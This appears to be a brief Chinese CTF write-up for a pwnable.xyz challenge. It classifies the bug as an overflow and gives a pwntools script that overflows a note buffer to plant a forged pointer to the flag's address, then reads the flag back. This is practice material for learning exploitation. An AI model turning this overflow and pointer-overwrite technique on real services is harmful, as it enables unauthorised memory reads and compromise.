### 分类

- 溢出，跟vm关系不大



### 脚本

```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

p = remote('svc.pwnable.xyz', 30048)
# p = process('./userland')

def editNote(ix, ct):
    p.sendlineafter(b'Exit\n', b'1')
    p.sendlineafter(b'id: ', str.encode(str(ix)))
    p.sendlineafter(b's: ', ct)


for i in range(9):
    editNote(i, b'aa')
flag_addr = 0x4100000
editNote(9, b'a' * 0x10 + p64(flag_addr) + p64(40))

p.sendlineafter(b'Exit\n', b'2')
p.sendlineafter(b'id: ', b'0')

# gdb.attach(p)

p.interactive()

```

